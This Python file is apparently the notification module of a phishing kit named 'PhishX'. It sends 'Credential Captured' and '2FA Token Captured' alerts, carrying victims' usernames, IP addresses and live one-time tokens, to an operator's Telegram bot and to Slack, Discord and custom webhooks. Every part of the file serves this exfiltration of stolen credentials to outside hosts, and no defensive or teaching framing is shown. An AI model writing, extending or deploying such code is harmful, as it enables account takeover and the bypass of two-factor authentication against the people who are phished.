import os
import json
import requests
from datetime import datetime

class NotificationManager:
    """Handle notifications for captured credentials and events"""
    
    def __init__(self):
        self.telegram_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        self.slack_webhook = os.environ.get('SLACK_WEBHOOK_URL')
        self.discord_webhook = os.environ.get('DISCORD_WEBHOOK_URL')
    
    def send_credential_alert(self, campaign_name, username, ip_address, country=None):
        """Send alert when credentials are captured"""
        message = f"🎣 **Credential Captured**\n"
        message += f"Campaign: {campaign_name}\n"
        message += f"Username: {username}\n"
        message += f"IP: {ip_address}\n"
        if country:
            message += f"Country: {country}\n"
        message += f"Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        self.send_telegram(message)
        self.send_slack(message)
        self.send_discord(message)
    
    def send_campaign_alert(self, campaign_name, action):
        """Send alert when campaign status changes"""
        message = f"📊 **Campaign {action.title()}**\n"
        message += f"Campaign: {campaign_name}\n"
        message += f"Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        self.send_telegram(message)
        self.send_slack(message)
    
    def send_2fa_alert(self, campaign_name, token, ip_address):
        """Send alert when 2FA token is captured"""
        message = f"🔐 **2FA Token Captured**\n"
        message += f"Campaign: {campaign_name}\n"
        message += f"Token: {token}\n"
        message += f"IP: {ip_address}\n"
        message += f"Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        self.send_telegram(message)
        self.send_slack(message)
        self.send_discord(message)
    
    def send_telegram(self, message):
        """Send message via Telegram bot"""
        if not self.telegram_token or not self.telegram_chat_id:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                'chat_id': self.telegram_chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            print(f"[TELEGRAM] Error sending message: {e}")
            return False
    
    def send_slack(self, message):
        """Send message via Slack webhook"""
        if not self.slack_webhook:
            return False
        
        try:
            data = {
                'text': message,
                'username': 'PhishX Bot',
                'icon_emoji': ':fishing_pole_and_fish:'
            }
            
            response = requests.post(self.slack_webhook, json=data, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            print(f"[SLACK] Error sending message: {e}")
            return False
    
    def send_discord(self, message):
        """Send message via Discord webhook"""
        if not self.discord_webhook:
            return False
        
        try:
            data = {
                'content': message,
                'username': 'PhishX Bot',
                'avatar_url': 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f3a3.png'
            }
            
            response = requests.post(self.discord_webhook, json=data, timeout=10)
            return response.status_code == 204
            
        except Exception as e:
            print(f"[DISCORD] Error sending message: {e}")
            return False
    
    def send_email(self, to_email, subject, message):
        """Send email notification (placeholder)"""
        # In production, implement SMTP email sending
        print(f"[EMAIL] To: {to_email}, Subject: {subject}")
        print(f"[EMAIL] Message: {message}")
        return True
    
    def send_webhook(self, webhook_url, data):
        """Send custom webhook notification"""
        try:
            response = requests.post(webhook_url, json=data, timeout=10)
            return response.status_code in [200, 201, 204]
        except Exception as e:
            print(f"[WEBHOOK] Error sending to {webhook_url}: {e}")
            return False
